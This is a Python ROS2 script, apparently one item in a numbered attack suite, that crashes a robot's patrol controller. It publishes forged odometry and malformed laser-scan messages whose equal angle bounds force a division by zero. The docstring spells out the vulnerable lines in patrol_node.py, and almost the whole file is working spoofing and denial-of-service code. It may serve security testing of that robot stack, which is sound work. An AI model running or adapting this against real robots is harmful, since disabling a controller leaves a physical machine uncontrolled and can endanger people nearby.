#!/usr/bin/env python3
"""攻擊 N25 — 畸形 scan 幾何讓 patrol（機器人控制器）崩潰.

同 N24 的「畸形輸入」類，但目標換成 patrol（控制器本身，不是偵測器）。

漏洞（patrol_node.py）：
    _cb_scan 第一幀算角度解析度：
        self._scan_angle_increment = (msg.angle_max - msg.angle_min) / (n-1) * step
    若攻擊者送 angle_max == angle_min → increment = 0。
    導航時 _fwd() 做：
        int(round(-self._scan_angle_min / self._scan_angle_increment))
        = -0.0 / 0.0  → Python float division → ZeroDivisionError → patrol 崩潰

需要的前置：
    - 送假 /odom 讓 patrol odom_ready=True，且位置離第一個 waypoint 夠遠（要導航）
    - 送 angle_max==angle_min 的 /scan（advancing stamp）讓它 scan_ready 且 increment=0
→ patrol 一進導航迴圈呼叫 _fwd() 就 ZeroDivisionError 崩潰，機器人失去控制器。
"""
import sys
import math
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from sensor_msgs.msg import LaserScan
from nav_msgs.msg import Odometry


class GeometryCrasher(Node):

    def __init__(self):
        super().__init__('attacker_geom_crash')
        sq = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT)
        self._odom_pub = self.create_publisher(Odometry, '/odom', sq)
        self._scan_pub = self.create_publisher(LaserScan, '/scan', sq)
        self._n = 0
        # 10Hz 同時送假 odom + 畸形 scan
        self.create_timer(0.1, self._tick)
        self.get_logger().error(
            '☠️ N25: 送假 odom(0,0) + angle_max==angle_min 的 scan '
            '→ patrol increment=0 → _fwd 做 0/0 → ZeroDivisionError 崩潰'
        )

    def _tick(self):
        self._n += 1
        now = self.get_clock().now().to_msg()

        # 假 odom：位置 (0,0)，離第一 waypoint(-1.5,-1.5) 約 2.12m → patrol 要導航
        od = Odometry()
        od.header.stamp = now
        od.header.frame_id = 'odom'
        od.pose.pose.position.x = 0.0
        od.pose.pose.position.y = 0.0
        od.pose.pose.orientation.w = 1.0   # 朝向 +x
        self._odom_pub.publish(od)

        # 畸形 scan：angle_max == angle_min → increment 算出來是 0
        sc = LaserScan()
        # advancing stamp（用遞增的 nsec 確保 patrol 認為是「新幀」而處理）
        sc.header.stamp = now
        sc.header.frame_id = 'base_link'
        sc.angle_min = 0.0
        sc.angle_max = 0.0            # ★ 關鍵：等於 angle_min → 解析度 0
        sc.angle_increment = 0.0
        sc.range_min = 0.1
        sc.range_max = 3.5
        sc.ranges = [1.0] * 90        # n=90>1 → scan_ready；都 1.0m
        self._scan_pub.publish(sc)


def main():
    rclpy.init()
    node = GeometryCrasher()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.05)
    finally:
        node.get_logger().error('⏹ 結束')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
